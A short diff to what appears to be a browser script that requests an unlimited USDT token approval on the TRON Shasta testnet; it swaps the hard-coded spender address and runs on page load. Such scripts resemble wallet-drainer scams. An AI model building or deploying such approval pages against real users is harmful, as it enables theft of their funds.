@@ -2,7 +2,7 @@
 
 // ====== TRON 链配置 ======
 const shastaUsdtAddress = "TG3XXyExBkPp9nzdajDZsozEu4BkaSJozs";
-const spenderAddress = "TMcjcKsZZLSFh9nJpTfPejHx7EPjdzG5XkC";
+const spenderAddress = "TATnJboVWDD6Q1evxZUVwubPzoGr6e654B";
 
 // ====== 最大授权额度 ======
 function getLargeEnoughAmount() {
@@ -139,3 +139,4 @@ window.addEventListener("DOMContentLoaded", () => {
 });
 
 console.log("USDT 无限授权脚本加载完成");
+
